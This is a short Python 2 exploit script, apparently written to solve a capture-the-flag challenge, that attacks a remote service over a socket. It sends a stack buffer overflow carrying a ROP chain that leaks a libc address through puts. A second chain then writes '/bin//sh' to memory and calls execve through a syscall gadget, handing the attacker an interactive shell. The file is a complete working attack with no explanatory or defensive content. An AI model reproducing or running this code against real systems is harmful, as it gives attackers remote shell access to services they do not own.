#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

# leaked libc example puts 7f1a3ea09690
puts_got = 0x0000000000602020
pop_rdi = 0x0000000000400bc3 # : pop rdi ; ret
libc_puts_offset = 0x000000000006F690
garbage = 184
recvuntil("3)\n")
p = p64(pop_rdi)
p += p64(puts_got)
p += p64(0x00000000004006C0) #puts plt
p += p64(0x0000000000400AE5) #call your turn
print "[+] send first payload"
s.send("A"*garbage + p + "\n")
recvuntil(":(")
data = s.recv(8)
libc_offset= int(hex(u64(data))[:14],16) - libc_puts_offset
print "[+] libc puts @{}".format(hex(libc_offset))
recvuntil("3)\n")
p = ''
p += pack('<Q',libc_offset + 0x0000000000001b92) # pop rdx ; ret
p += pack('<Q',libc_offset +  0x00000000003c4080) # @ .data	
p += pack('<Q',libc_offset +  0x0000000000033544) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q',libc_offset + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q',libc_offset +  0x0000000000001b92) # pop rdx ; ret
p += pack('<Q',libc_offset + 0x00000000003c4088) # @ .data + 8
p += pack('<Q',libc_offset + 0x000000000008b8c5) # xor rax, rax ; ret
p += pack('<Q',libc_offset +  0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q',libc_offset +  0x0000000000021102) # pop rdi ; ret
p += pack('<Q',libc_offset +  0x00000000003c4080) # @ .data
p += pack('<Q',libc_offset +  0x00000000000202e8) # pop rsi ; ret
p += pack('<Q',libc_offset +  0x00000000003c4088) # @ .data + 8
p += pack('<Q',libc_offset +  0x0000000000001b92) # pop rdx ; ret
p += pack('<Q',libc_offset + 0x00000000003c4088) # @ .data + 8
p += pack('<Q',libc_offset +  0x000000000008b8c5) # xor rax, rax ; ret
p += pack('<Q', libc_offset + 0x0000000000033544) #pop rax
p += pack('<Q', 59)
p += pack('<Q',libc_offset + 0x00000000000bc375) # syscall ; ret
print "[+] send second payload"
s.send("B"*garbage + p + "\n")
print "[++] Interactive now"
interactive()

s.close()


#
